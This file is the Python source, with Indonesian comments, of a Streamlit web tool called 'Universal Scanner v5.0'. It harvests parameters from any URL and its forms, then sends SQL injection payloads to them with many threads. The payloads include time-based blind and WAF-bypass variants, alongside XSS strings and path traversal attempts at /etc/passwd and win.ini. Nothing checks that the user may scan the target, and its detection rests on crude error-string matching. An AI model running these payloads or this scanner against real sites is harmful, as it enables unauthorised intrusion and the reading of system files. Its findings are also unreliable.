import streamlit as st
import requests
import re
import random
import time
from collections import deque
from urllib.parse import urljoin, urlparse, parse_qs, quote
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from typing import List, Dict, Set, Tuple, Optional
import warnings
warnings.filterwarnings('ignore')

# ================= KONFIGURASI =================
MAX_THREADS = 30
CRAWL_LIMIT = 100
REQUEST_TIMEOUT = 5
RATE_LIMIT_DELAY = 0.05

# Parameter umum untuk diuji jika URL tidak memiliki parameter
COMMON_PARAMS = ['id', 'page', 'cat', 'q', 'search', 's', 'keyword', 'product', 'user', 'email', 'name', 'filter', 'order', 'sort']

# ================= DATA CLASSES =================
@dataclass
class Vulnerability:
    url: str
    param: str
    payload: str
    vuln_type: str
    severity: str
    confidence: float
    evidence: str
    response_time: float
    status_code: int
    response_size: int

@dataclass
class ScanResult:
    target: str
    vulnerabilities: List[Vulnerability] = field(default_factory=list)
    crawled_urls: List[str] = field(default_factory=list)
    parameters_tested: List[str] = field(default_factory=list)
    scan_time: float = 0
    waf_detected: bool = False
    waf_names: List[str] = field(default_factory=list)

# ================= PAYLOAD DATABASE =================
SQLI_PAYLOADS = [
    "' OR '1'='1", "' OR 1=1--", "' OR 1=1#", 
    "' UNION SELECT NULL--", "' UNION SELECT @@version--",
    "' OR SLEEP(2)--", "' WAITFOR DELAY '00:00:02'--",
    "' OR BENCHMARK(5000000,MD5('x'))--",
    "' AND 1=1--", "' AND 1=2--",
    # WAF bypass
    "'%2520OR%2520'1'%2520%253D%2520'1",
    "'/*!50000OR*/ 1=1--",
    "%00' OR 1=1--",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
    "<ScRiPt>alert(1)</ScRiPt>", "javascript:alert(1)",
]

PATH_TRAVERSAL = [
    "../../../etc/passwd", "..\\..\\..\\windows\\win.ini",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
]

# ================= WAF DETECTOR =================
class WAFDetector:
    def __init__(self):
        self.signatures = {
            "Cloudflare": ["cf-ray", "__cfduid"],
            "ModSecurity": ["Mod_Security", "406 Not Acceptable"],
            "AWS WAF": ["x-amzn-RequestId"],
        }
    def detect(self, response: requests.Response) -> Tuple[bool, List[str]]:
        headers_lower = {k.lower(): v.lower() for k,v in response.headers.items()}
        detected = []
        for waf, sigs in self.signatures.items():
            for sig in sigs:
                if sig in str(headers_lower) or sig in response.text.lower():
                    detected.append(waf)
                    break
        return len(detected)>0, detected

# ================= PARAMETER DISCOVERY =================
class ParameterDiscovery:
    @staticmethod
    def from_url(url: str) -> List[str]:
        """Ekstrak parameter dari URL"""
        parsed = urlparse(url)
        params = list(parse_qs(parsed.query).keys())
        return params

    @staticmethod
    def from_forms(html: str, base_url: str) -> List[Dict]:
        """Ekstrak form dan input names"""
        forms = []
        form_matches = re.finditer(r'<form[^>]*>(.*?)</form>', html, re.IGNORECASE | re.DOTALL)
        for fm in form_matches:
            form_html = fm.group(0)
            action = re.search(r'action=["\']([^"\']*)["\']', form_html, re.IGNORECASE)
            action_url = urljoin(base_url, action.group(1)) if action else base_url
            method = re.search(r'method=["\']([^"\']*)["\']', form_html, re.IGNORECASE)
            method = method.group(1).upper() if method else "GET"
            inputs = re.findall(r'<input[^>]*name=["\']([^"\']*)["\']', form_html, re.IGNORECASE)
            if inputs:
                forms.append({
                    'url': action_url,
                    'method': method,
                    'params': inputs
                })
        return forms

    @staticmethod
    def common_params() -> List[str]:
        return COMMON_PARAMS.copy()

# ================= TIME-BASED DETECTOR =================
class TimeBasedDetector:
    @staticmethod
    def check_sleep(url: str, param: str, sleep: int = 2) -> Tuple[bool, float]:
        """Uji time-based blind injection pada parameter"""
        payload = f"' OR SLEEP({sleep})--"
        test_url = f"{url}?{param}={quote(payload)}"
        try:
            start = time.time()
            requests.get(test_url, timeout=sleep+2)
            elapsed = time.time() - start
            return elapsed >= sleep, elapsed
        except:
            return False, 0

# ================= SCANNER UTAMA (TANPA PARAMETER WAJIB) =================
class ExtremeScanner:
    def __init__(self, target: str):
        self.target = target
        self.session = requests.Session()
        self.waf_detector = WAFDetector()
        self.results = ScanResult(target=target)

    def discover_parameters(self) -> Tuple[List[str], List[Dict]]:
        """Temukan semua parameter potensial: dari URL, form, dan common params"""
        params_set = set()
        forms_list = []

        # 1. Parameter dari URL
        url_params = ParameterDiscovery.from_url(self.target)
        params_set.update(url_params)

        # 2. Ambil halaman utama untuk form
        try:
            resp = self.session.get(self.target, timeout=5)
            html = resp.text
            forms = ParameterDiscovery.from_forms(html, self.target)
            for f in forms:
                forms_list.append(f)
                params_set.update(f['params'])
        except:
            pass

        # 3. Parameter umum (default)
        params_set.update(ParameterDiscovery.common_params())

        # Kembalikan parameter unik dan daftar form
        return list(params_set), forms_list

    def test_parameter(self, url: str, param: str) -> List[Vulnerability]:
        """Uji parameter dengan semua payload (termasuk time-based)"""
        findings = []
        for payload in SQLI_PAYLOADS[:30]:
            test_url = f"{url}?{param}={quote(payload)}"
            try:
                resp = self.session.get(test_url, timeout=REQUEST_TIMEOUT)
                # Deteksi anomali sederhana
                if resp.status_code != 403:
                    if any(err in resp.text.lower() for err in ['error', 'mysql', 'syntax', 'warning']):
                        findings.append(Vulnerability(
                            url=url, param=param, payload=payload,
                            vuln_type="SQL Injection", severity="MEDIUM",
                            confidence=0.7, evidence="Error indicator found",
                            response_time=resp.elapsed.total_seconds(),
                            status_code=resp.status_code, response_size=len(resp.text)
                        ))
            except:
                pass
        # Time-based blind (tidak peduli status code)
        detected, elapsed = TimeBasedDetector.check_sleep(url, param, 2)
        if detected:
            findings.append(Vulnerability(
                url=url, param=param, payload="' OR SLEEP(2)--",
                vuln_type="SQL Injection (Time-based Blind)",
                severity="HIGH", confidence=0.95,
                evidence=f"Delay {elapsed:.2f}s",
                response_time=elapsed, status_code=0, response_size=0
            ))
        return findings

    def test_form(self, form: Dict) -> List[Vulnerability]:
        """Uji parameter pada form (POST/GET)"""
        findings = []
        method = form['method']
        url = form['url']
        for param in form['params']:
            for payload in SQLI_PAYLOADS[:20]:
                data = {param: payload}
                try:
                    if method == 'POST':
                        resp = self.session.post(url, data=data, timeout=REQUEST_TIMEOUT)
                    else:
                        resp = self.session.get(url, params=data, timeout=REQUEST_TIMEOUT)
                    if resp.status_code != 403 and any(err in resp.text.lower() for err in ['error', 'mysql']):
                        findings.append(Vulnerability(
                            url=url, param=param, payload=payload,
                            vuln_type="SQL Injection (Form)", severity="MEDIUM",
                            confidence=0.6, evidence="Form error",
                            response_time=resp.elapsed.total_seconds(),
                            status_code=resp.status_code, response_size=len(resp.text)
                        ))
                except:
                    pass
        return findings

    def test_path_traversal(self) -> List[Vulnerability]:
        """Uji path traversal pada URL path"""
        findings = []
        parsed = urlparse(self.target)
        base_path = parsed.path.rstrip('/')
        for payload in PATH_TRAVERSAL:
            test_path = f"{base_path}/{payload}"
            test_url = parsed._replace(path=test_path).geturl()
            try:
                resp = self.session.get(test_url, timeout=REQUEST_TIMEOUT)
                if "root:" in resp.text or "win.ini" in resp.text:
                    findings.append(Vulnerability(
                        url=test_url, param="path", payload=payload,
                        vuln_type="Path Traversal", severity="HIGH",
                        confidence=0.9, evidence="File content detected",
                        response_time=resp.elapsed.total_seconds(),
                        status_code=resp.status_code, response_size=len(resp.text)
                    ))
            except:
                pass
        return findings

    def scan(self) -> ScanResult:
        start_time = time.time()
        st.write("🔍 Phase 1: Parameter Discovery (Otomatis)")

        # Temukan semua parameter
        all_params, forms = self.discover_parameters()
        self.results.parameters_tested = all_params
        st.info(f"Ditemukan {len(all_params)} parameter potensial: {', '.join(all_params[:10])}{'...' if len(all_params)>10 else ''}")
        st.info(f"Ditemukan {len(forms)} form HTML")

        # Deteksi WAF dari halaman utama
        try:
            resp = self.session.get(self.target, timeout=5)
            has_waf, waf_names = self.waf_detector.detect(resp)
            self.results.waf_detected = has_waf
            self.results.waf_names = waf_names
            st.info(f"🛡️ WAF terdeteksi: {waf_names if waf_names else 'Tidak ada'}")
        except:
            pass

        # Phase 2: Testing
        st.write("⚡ Phase 2: Vulnerability Testing")
        vulnerabilities = []

        # Test parameter pada URL (dengan menambahkan parameter jika belum ada)
        base_url = self.target
        if '?' not in base_url:
            # Jika tidak ada parameter, kita uji setiap parameter umum dengan menambahkannya ke URL
            for param in all_params[:20]:
                findings = self.test_parameter(base_url, param)
                vulnerabilities.extend(findings)
        else:
            # Jika sudah ada parameter, uji langsung
            parsed = urlparse(base_url)
            existing_params = parse_qs(parsed.query).keys()
            for param in existing_params:
                findings = self.test_parameter(base_url, param)
                vulnerabilities.extend(findings)

        # Test form
        with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
            futures = [executor.submit(self.test_form, f) for f in forms]
            for future in as_completed(futures):
                vulnerabilities.extend(future.result())

        # Test path traversal
        path_vulns = self.test_path_traversal()
        vulnerabilities.extend(path_vulns)

        self.results.vulnerabilities = vulnerabilities
        self.results.scan_time = time.time() - start_time
        return self.results

# ================= MAIN UI =================
def main():
    st.set_page_config(page_title="🔥 Universal Scanner (No Parameter Needed)", layout="wide")
    st.title("🔥 UNIVERSAL SCANNER v5.0")
    st.markdown("*Bisa memindai URL apapun – otomatis menemukan parameter dari form & common params*")

    target = st.text_input("Target URL (tanpa parameter pun boleh)", placeholder="https://example.com/index.php")
    if st.button("🚀 START SCAN"):
        if not target:
            st.error("Masukkan URL")
            return
        if not target.startswith(('http://','https://')):
            target = 'https://' + target

        scanner = ExtremeScanner(target)
        with st.spinner("Scanning... (bisa memakan waktu 1-2 menit)"):
            results = scanner.scan()
        st.success(f"✅ Selesai dalam {results.scan_time:.2f} detik")
        st.write(f"**Parameter yang diuji:** {len(results.parameters_tested)}")
        st.write(f"**Kerentanan ditemukan:** {len(results.vulnerabilities)}")

        for v in results.vulnerabilities:
            if "Time-based" in v.vuln_type:
                st.error(f"🚨 **{v.vuln_type}** pada parameter `{v.param}` | Confidence {v.confidence:.0%}")
            else:
                st.warning(f"⚠️ **{v.vuln_type}** pada `{v.param}` | Payload: `{v.payload}`")

if __name__ == "__main__":
    main()
